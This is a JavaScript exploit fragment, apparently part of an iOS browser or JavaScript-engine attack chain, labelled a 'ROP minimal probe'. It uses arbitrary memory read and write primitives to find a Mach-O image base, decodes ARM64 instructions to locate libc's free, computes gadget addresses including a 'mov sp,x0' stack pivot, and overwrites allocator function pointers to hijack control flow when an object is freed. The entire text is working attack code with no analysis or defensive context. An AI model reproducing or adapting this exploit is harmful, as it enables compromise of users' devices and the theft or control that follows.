/* ===== iOS ROP minimal probe v2: mov sp,x0 (header-aligned) -> pthread_exit ===== */
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32_(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n) { setres('M2_NO_BASE'); return; }
  var libcFree = 0n;
  if (rd32_(js_free) === 0xaa0103e0) {
    var br = rd32_(js_free + 4n);
    if (((br & 0xfc000000) >>> 0) === 0x14000000) {
      var im = br & 0x03ffffff;
      if (im & 0x02000000) im -= 0x04000000;
      var plt = js_free + 4n + BigInt(im) * 4n;
      var ad = rd32_(plt);
      if (((ad & 0x9f000000) >>> 0) === 0x90000000) {
        var ml = (ad >>> 29) & 3, mh = (ad >>> 5) & 0x7ffff;
        var ai = (mh << 2) | ml;
        if (ai & 0x100000) ai -= 0x200000;
        var pg = (plt & ~0xfffn) + BigInt(ai) * 4096n;
        var ld = rd32_(plt + 4n);
        if (((ld & 0xffc00000) >>> 0) === 0xf9400000) {
          var g2 = RD(pg + BigInt((ld >>> 10) & 0xfff) * 8n);
          if (codeok(g2)) libcFree = g2;
        }
      }
    }
  }
  if (libcFree === 0n) { setres('M2_NO_FREE'); return; }
  var PEXIT = u64(libcFree + 0x4a21a474n);
  var G_X0 = base + 0x628a2cn;
  /* JavaScriptCore+0x3a0ee8: mov sp,x0 ; ret  (x0 = block header, 16-aligned) */
  var PIVOT2 = u64(libcFree - 0x66cccfcn);

  if (!V.length) { setres('M2_NO_V'); return; }
  ENT = V[0]; D = ENT.D;
  Wb = (ENT.cls === 29 ? ENT.vb : ENT.va);
  Rb = (ENT.cls === 29 ? ENT.va : ENT.vb);
  Ridx = (ENT.k + 56) >> 3;

  function put64(arr, off, val) {
    var v = u64(val);
    for (var i = 0; i < 8; i++) arr[off + i] = Number((v >> BigInt(i * 8)) & 0xffn);
  }
  var RT_FREE = rt + 16n, RT_USABLE = rt + 32n, RT_SIZE = rt + 48n, RT_OPAQUE = rt + 64n;
  /* js_free_rt tail with SP = header (= U-8):
     x22 <- [SP+0x10] = U+0x08
     x21 <- [SP+0x18] = U+0x10
     x20 <- [SP+0x20] = U+0x18
     x19 <- [SP+0x28] = U+0x20
     x30 <- [SP+0x38] = U+0x30
     SP  = U+0x38, br mf.js_free */
  put64(TRIG, 0x08, D);
  put64(TRIG, 0x10, 0n);
  put64(TRIG, 0x18, 0n);
  put64(TRIG, 0x20, PEXIT);
  put64(TRIG, 0x28, 0n);
  put64(TRIG, 0x30, 0n);
  setres('M2_FREE=' + hex(libcFree) + ' P=' + hex(PIVOT2));
  for (var z = 0; z < 0x40; z++) ENT.u8[z] = 0;
  setR(RT_FREE); Rb[0] = G_X0;
  setR(RT_SIZE); Rb[0] = 0xffffffffffffffffn;
  setR(RT_OPAQUE); Rb[0] = 0n;
  setR(RT_USABLE); Rb[0] = PIVOT2;
  try { TRIG = null; } catch (e) { setres('M2_EXC'); return; }
  setres('M2_AFTER');
